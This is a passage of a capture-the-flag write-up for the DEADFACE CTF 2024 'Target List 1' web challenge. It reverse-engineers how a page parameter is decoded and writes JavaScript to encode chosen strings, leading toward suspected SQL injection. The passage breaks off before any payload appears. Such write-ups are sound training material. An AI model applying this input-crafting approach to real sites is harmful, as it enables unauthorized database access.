<!DOCTYPE html><!--sdJrv7_XmnxBoagrmkq4p--><html class="dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae" as="image"/><link rel="stylesheet" href="/_next/static/chunks/0ae28dad4c293945.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/9563dab5ba30607d.js"/><script src="/_next/static/chunks/df3f54071a4ab395.js" async=""></script><script src="/_next/static/chunks/5d5c0b7cd85c39a9.js" async=""></script><script src="/_next/static/chunks/88f90e91bf073dc9.js" async=""></script><script src="/_next/static/chunks/turbopack-448117163d91e6d2.js" async=""></script><script src="/_next/static/chunks/ff1a16fafef87110.js" async=""></script><script src="/_next/static/chunks/d037381d3416c607.js" async=""></script><script src="/_next/static/chunks/44838f11011a9f2d.js" async=""></script><script src="/_next/static/chunks/03f4569ba78edab9.js" async=""></script><script src="/_next/static/chunks/44f6ea3170f4e31a.js" async=""></script><script src="/_next/static/chunks/39b99946d2be6a43.js" async=""></script><script src="/_next/static/chunks/116d3b69f07f8eb7.js" async=""></script><link rel="preload" href="https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd" as="image"/><meta name="next-size-adjust" content=""/><title>DEADFACE CTF 2024 — Target List 1 | kevin.fish</title><meta name="description" content="Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide."/><meta property="og:title" content="DEADFACE CTF 2024 — Target List 1"/><meta property="og:description" content="Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="DEADFACE CTF 2024 — Target List 1"/><meta name="twitter:description" content="Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide."/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>DEADFACE CTF 2024 — Target List 1</h1>
<blockquote>
<p>Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.</p>
<p><a href="http://targetlist.deadface.io:3001">http://targetlist.deadface.io:3001</a></p>
</blockquote>
<p>We&#x27;re given a simple website that looks like this:</p>
<p><img src="https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c" alt="image"/></p>
<p>On each &quot;page&quot;, we can find records that begin with &quot;A&quot;, &quot;B&quot;, and &quot;C&quot;:</p>
<p><img src="https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4" alt="image"/></p>
<p>At first, it looks like we get to query users that start with</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> page</span><span class="token punctuation">)</span></code></pre></div></div>
<p>where <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">page</code> is the integer query parameter passed to the page.</p>
<p>If we manually edit the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">&amp;page=</code> query parameter to go to page 4, it looks like we can query users beginning with &quot;D&quot; as expected.</p>
<p><img src="https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8" alt="image"/></p>
<p>Similarly, we can query users with &quot;I&quot; on page 9, but somehow the query changes to &quot;II&quot; on page 99, &quot;IÙ&quot; on page 999, and &quot;IÙI&quot; on page 9999:</p>
<p><img src="https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645" alt="image"/></p>
<p>so it looks like our input gets grouped into pairs when parsed. Furthermore, if we go to page <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">f</code>, we end up querying users starting with &quot;O&quot;; &#x27;A&#x27; + 15.</p>
<p><img src="https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae" alt="image"/></p>
<p>With this, we get a pretty clear picture of how our query parameter is parsed: a 0 is appended to the input, then the page number is interpreted as hex bytes (where 64 is added to each byte so 1 maps to &quot;A&quot;). Then, we can guess our input is handled something like so:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">conv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">const</span><span class=""> chars </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">(</span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">let</span><span class=""> i </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">&lt;</span><span class=""> chars</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">+=</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token keyword">let</span><span class=""> byte </span><span class="token operator">=</span><span class=""> chars</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> chars</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class=""> byte </span><span class="token operator">+=</span><span class=""> chars</span><span class="token punctuation">[</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token keyword">let</span><span class=""> num </span><span class="token operator">=</span><span class=""> </span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="">byte</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> </span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="">num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p><img src="https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5" alt="image"/></p>
<p>But then, when we go to page <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">162</code>,</p>
<p><img src="https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4" alt="image"/></p>
<p>Why would the cent character cause things to fail? If we go to page <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">163</code>, something&#x27;s not right; we get &quot;#&quot; instead of &quot;£&quot; as expected:</p>
<p><img src="https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c" alt="image"/></p>
<p><img src="https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06" alt="image"/></p>
<p>Then, there must be a narrow range of characters where our bytes <em>are</em> subtracted by 128 allowing us to get a wider range of characters. To simplify things, we can assume this range applies to everything above 128 (not true for page <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">999</code> seen earlier, but the discrepancy is ultimately unimportant to solve the challenge):</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">conv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">const</span><span class=""> rest </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">(</span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">let</span><span class=""> i </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">&lt;</span><span class=""> rest</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">;</span><span class=""> i </span><span class="token operator">+=</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token keyword">let</span><span class=""> group </span><span class="token operator">=</span><span class=""> rest</span><span class="token punctuation">[</span><span class="">i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> rest</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class="token punctuation">)</span><span class=""> group </span><span class="token operator">+=</span><span class=""> rest</span><span class="token punctuation">[</span><span class="">i </span><span class="token operator">+</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token keyword">let</span><span class=""> num </span><span class="token operator">=</span><span class=""> </span><span class="token number">64</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="">group</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">num </span><span class="token operator">&gt;</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">)</span><span class=""> num </span><span class="token operator">-=</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> </span><span class="token known-class-name class-name">String</span><span class="token punctuation">.</span><span class="token method function property-access">fromCharCode</span><span class="token punctuation">(</span><span class="">num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p><img src="https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301" alt="image"/></p>
<p>So our input was actually failing on double quotes... could that imply it was being passed to a database as an SQL query? Based on the updated <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">conv()</code> function, we can write a simple <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">deconv()</code> function to reverse desired strings to query param bytes:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">function</span><span class=""> </span><span class="token function">deconv</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token keyword">let</span><span class=""> ret </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;1&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">const</span><span class=""> c </span><span class="token keyword">of</span><span class=""> s</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        </span><span class="token keyword">let</span><span class=""> diff </span><span class="token operator">=</span><span class=""> c</span><span class="token punctuation">.</span><span class="token method function property-access">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class=""> </span><span class="token number">64</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">diff </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> diff </span><span class="token operator">+=</span><span class=""> </span><span class="token number">128</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword">let</span><span class=""> str </span><span class="token operator">=</span><span class=""> diff</span><span class="token punctuation">.</span><span class="token method function property-access">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">str</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class=""> </span><span class="token operator">&lt;</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class=""> str </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;0&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> str</span><span class="token punctuation">;</span><span class="">
